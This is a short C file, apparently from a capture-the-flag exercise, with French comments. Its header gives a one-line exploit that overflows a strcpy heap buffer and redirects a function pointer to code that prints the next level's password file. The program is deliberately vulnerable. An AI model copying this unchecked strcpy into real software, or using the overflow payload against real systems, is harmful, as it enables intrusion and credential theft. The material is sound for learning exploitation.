/*
	Pour compiler le .c:
	gcc -m32 -fno-stack-protector source.c -o level6

	Ensuite:
	./level6 $(python -c 'print "A"*80+"\xc0\x84\x04\x08"')
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void	n(void)
{
	system("/bin/cat /home/user/level7/.pass");	// Fonction qui permet d'afficher le pass
}

void	m(void)
{
	puts("Nope");	// Fonction qui affiche un message
}

typedef void (*f_ptr)(void);	// On déclare un type de donnée pour pouvoir caster par la suite

int 	main(int ac, char **av)
{
	char	*str1;	// Chaine qui va contenir l'argv[1]
	void	*str2;	// Adresse de la fonction à lancer
	f_ptr	f;		// Fonction à lancer

	str1 = (char*)malloc(64);	// Allocation de 64 en mémoire
	str2 = malloc(4);			// Allocation de 4 en mémoire
	*((unsigned long *)str2) = (unsigned long)m;	// str2 va contenir l'adresse de m()
	strcpy(str1, av[1]);	// On copie l'argv[1] dans str1
	f = *((f_ptr*)str2);	// La fonction est égal à str2 qui elle a été modifié avec strcpy
	f();	// On lance la fonction
}
